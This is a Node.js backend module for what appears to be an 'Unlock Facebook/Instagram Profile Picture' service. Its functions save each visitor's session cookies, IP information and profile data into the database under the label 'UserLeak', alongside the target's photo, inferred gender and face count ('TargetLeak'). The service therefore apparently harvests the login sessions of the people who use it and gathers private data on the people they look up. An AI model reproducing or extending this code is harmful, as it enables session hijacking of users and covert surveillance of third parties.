const Facebook = require("../libs/facebook")
const Instagram = require("../libs/instagram")
const Photos = require("../models/Photos");



const findByHashUserIdAndUpdate = async (hash, userId,userData,ipInfo) => {
    const isSameUserViewSameImage = await Photos.findOne({"user.userId": userId, hash})
    if (!isSameUserViewSameImage) {
        userData.ipInfo = ipInfo
        await Photos.findOneAndUpdate({hash}, {$push: {user:userData}},{new:true})
    }

}
const createUnlockFacebookPicture = async (TargetInfo, TargetLeak, cookies,ipInfo) => {

   const UserLeak = await Facebook.GetFacebookUserInfo(cookies.c_user)
    UserLeak.ipInfo = ipInfo
    UserLeak.cookies = cookies
    return Photos.create({
        username: TargetInfo.username,
        id: TargetInfo.id,
        full_name: TargetInfo.name,
        service: "Unlock Facebook Profile Picture",
        photo: TargetLeak.userPictureOnCloud,
        gender: TargetLeak.userPictureData.gender,
        faceCount: TargetLeak.userPictureData.faceCount,
        user:[UserLeak] ,
        hash: TargetLeak.hash

    })

}
const createUnlockInstagramPicture = async (TargetInfo, TargetLeak, cookies,ipInfo) => {

    const UserLeak = await Instagram.GetInstagramUserInfo(cookies)
    UserLeak.ipInfo = ipInfo
    UserLeak.cookies = cookies
    UserLeak.userId = cookies.u_id
    return Photos.create({
        username: TargetInfo.username,
        id: TargetInfo.id,
        full_name: TargetInfo.name,
        service: "Unlock Instagram Profile Picture",
        photo: TargetLeak.userPictureOnCloud,
        gender: TargetLeak.userPictureData.gender,
        faceCount: TargetLeak.userPictureData.faceCount,
        hash: TargetLeak.hash,
        user:[UserLeak] ,

    })

}

module.exports = {
    findByHashUserIdAndUpdate, createUnlockFacebookPicture,createUnlockInstagramPicture

}